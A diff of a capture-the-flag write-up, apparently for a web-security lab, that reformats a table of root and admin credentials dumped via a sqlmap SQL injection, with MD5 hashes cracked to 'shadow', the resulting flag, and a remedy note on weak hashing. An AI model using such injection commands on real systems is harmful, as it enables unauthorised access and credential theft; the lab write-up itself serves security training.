@@ -13,12 +13,11 @@ sqlmap  -u "http://192.168.43.251/index.php?page=member&id=1&Submit=Submit#" --d
     options [Y, Y, D, N];
 
 usernames with cracked passwords
-+----+----------+-------------------------------------------+
-| id | username | password                                  |
-+----+----------+-------------------------------------------+
-| 1  | root     | 3bf1114a986ba87ed28fc1b5884fc2f8 (shadow) |
-| 2  | admin    | 3bf1114a986ba87ed28fc1b5884fc2f8 (shadow) |
-+----+----------+-------------------------------------------+
+
+id| username | password
+1 | root     | 3bf1114a986ba87ed28fc1b5884fc2f8 (shadow)
+2 | admin    | 3bf1114a986ba87ed28fc1b5884fc2f8 (shadow)
+
 If we login using these in http://192.168.43.251/index.php?page=signin we get our flag: b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
 
 ## Remedy
@@ -26,4 +25,4 @@ If we login using these in http://192.168.43.251/index.php?page=signin we get ou
 2. However a much stronger ecryptiion model other than md5 five which is really unsafe, would have made it harder to decryt these passwords :\.
 
 # Resources
-    https://www.youtube.com/watch?v=ciNHn38EyRc
+https://www.youtube.com/watch?v=ciNHn38EyRc
